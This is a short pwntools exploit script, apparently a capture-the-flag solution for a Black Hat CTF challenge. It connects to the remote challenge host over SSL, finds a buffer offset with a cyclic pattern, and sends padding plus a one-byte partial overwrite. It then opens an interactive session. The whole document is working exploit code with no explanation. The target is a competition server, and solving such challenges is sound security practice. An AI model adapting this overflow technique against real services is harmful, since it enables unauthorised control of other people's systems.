from pwn import *
context.log_level="debug"

elf = ELF("./main",checksec=False)
context.arch=elf.arch

p=remote("blackhat4-ab60f1b2d69da13deb5e52cbe83276f4-0.chals.bh.ctf.sa", 443, ssl=True, sni="blackhat4-ab60f1b2d69da13deb5e52cbe83276f4-0.chals.bh.ctf.sa")
offset=cyclic_find("aafa")
payload=flat(
    offset*"A",
    p8(0x08)
)
p.send(payload)

p.interactive()
